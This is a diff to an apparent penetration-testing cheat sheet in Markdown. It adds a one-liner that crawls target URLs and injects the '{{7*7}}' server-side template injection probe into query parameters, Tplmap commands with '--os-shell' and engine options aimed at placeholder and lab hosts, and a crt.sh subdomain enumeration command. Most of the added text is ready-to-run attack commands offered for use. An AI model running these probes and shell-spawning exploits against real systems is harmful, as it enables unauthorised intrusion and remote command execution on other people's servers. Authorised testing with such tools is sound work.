@@ -29,6 +29,7 @@
 [Subzy](https://github.com/PentestPad/subzy)<br>
 [Whatweb](https://www.kali.org/tools/whatweb/)<br>
 [Nikto](https://github.com/sullo/nikto/tree/master)<br>
+[Tplmap](https://github.com/epinna/tplmap)<br>
 
 
 ###  HTTP200. 
@@ -62,6 +63,13 @@ whatweb $(cat url) | anew whatweb;
 subfinder -d $(cat url) -silent -all | httpx-toolkit -silent | anew subfinder;
 ```
 
+###  SSTI. 
+
+```bash
+echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '{{7*7}}' | freq | anew ssti;
+```
+
+
 ###  SubzyTakeOver. 
 
 ```bash
@@ -90,6 +98,20 @@ sudo dalfox url https://testphp.vulnweb.com/listproducts.php?cat=
 ```bash
 cd nikto/program
 ./nikto.pl -h http://www.example.com
+```
+
+###  Tplmap. 
+
+```bash
+python2.7 ./tplmap.py -u '<http://www.target.com/page?name=John*>' --os-shell
+python2.7 ./tplmap.py -u "<http://192.168.56.101:3000/ti?user=*&comment=supercomment&link>"
+python2.7 ./tplmap.py -u "<http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link>" --level 5 -e jade
+```
+
+###  Crt.sh. 
+
+```bash
+curl -s "https://crt.sh/?q=$(cat url)&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx-toolkit -title -silent | anew crtsh;
 ```
 
 
